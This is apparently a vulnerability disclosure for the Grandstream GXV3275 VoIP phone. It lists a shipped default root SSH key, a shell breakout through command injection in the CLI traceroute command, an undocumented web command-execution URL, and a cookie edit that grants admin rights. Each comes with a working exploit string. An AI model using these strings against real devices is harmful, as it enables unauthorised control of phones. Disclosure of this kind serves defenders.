@@ -1,0 +1,49 @@
+The Grandstream GXV3275 is an Android-based VoIP phone. Several
+vulnerabilities were found affecting this device.
+
+* The device ships with a default root SSH key, which could be used as a
+backdoor:
+
+/system/root/.ssh # cat authorized_keys
+Public key portion is:
+ssh-rsa
+AAAAB3NzaC1yc2EAAAADAQABAAAAgwCIcYbgmdHTpTeDcBA4IOg5Z7d2By0GXGihZzcTxZC+YTWGUe/HJc+pYDpDrGMWg0hMqd+JPs1GaLNw4pw0Mip6VMT7VjoZ8Z+n2ULNyK1IoTU4C3Ea4vcYVR8804Pvh9vXxC0iuMEr1Jx7SewUwSlABX04uVpEObgnUhpi+hn/H34/
+jhzhao@jhzhao-Lenovo
+Fingerprint: md5 7b:6e:a0:00:19:54:a6:39:84:1f:f9:18:2e:79:61:b5
+
+This issue has not been resolved.
+
+* The SSH interface only provides access to a limited CLI. The CLI's ping
+and traceroute commands will pass user input as parameters to underlying
+system commands without escaping shell metacharacters. This can be
+exploited to break out to a shell:
+
+GXV3275 > traceroute $(sh)
+
+This shell will only see stderr, so we then need to run sh with stdout
+redirected to stderr:
+
+sh 1>&2
+
+This issue has been resolved in firmware version 1.0.3.30.
+
+* The web interface exposes an undocumented command execution API:
+
+
+http://DEVICEIP/manager?action=execcmd&command=echo%20%22hello%22%20%3E%20/system/root/test.txt
+
+This issue has been resolved in firmware version 1.0.3.30.
+
+* The web interface allows unprivileged users to escalate privileges by
+modifying a cookie on the client side:
+
+javascript:void(document.cookie="type=admin")
+
+Full details are available here:
+
+http://davidjorm.blogspot.com/2015/07/101-ways-to-pwn-phone.html
+
+MITRE was contacted repeatedly requesting CVE names for these issues, but
+never replied.
+
+David
